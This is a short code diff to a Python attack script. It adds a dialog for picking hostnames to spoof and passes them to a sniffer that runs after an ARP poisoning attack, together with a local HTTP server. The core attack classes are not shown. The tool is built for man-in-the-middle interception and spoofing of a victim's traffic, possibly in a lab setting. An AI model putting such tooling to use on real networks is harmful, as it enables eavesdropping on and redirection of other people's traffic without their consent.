@@ -94,6 +94,26 @@ spoofVictims = radiolist_dialog(
 if spoofVictims == None:
     exit()
 
+
+
+# Select hostnames to spoof
+hostNames = input_dialog(
+    title="Select hostnames",
+    text="Please enter the hostnames to spoof, seperated by |. For all, press OK."
+)
+
+# If the user selects cancel, the GUI will be exited and the program will be stop executing. 
+if hostNames == None:
+    exit()
+
+# Parse the hostnames input
+if hostNames == "":
+    hostNames = "*"
+else:
+    hostNames = hostNames.split("|")
+
+    
+
 # The time the attack will be repeated in seconds
 repeatAttackTime = input_dialog(
     title='Repeat Time',
@@ -120,7 +140,7 @@ while (not repeatAttackTime.isdigit()):
 arpAttack = ARPPoisonAttack(iface, victim, spoofVictims)
 arpAttack.execute()
 
-sniffer = Sniffer(iface, victim)
+sniffer = Sniffer(iface, victim, hostNames)
 httpServer = HTTPServer()
 
 print("[*] Start sniffing...")
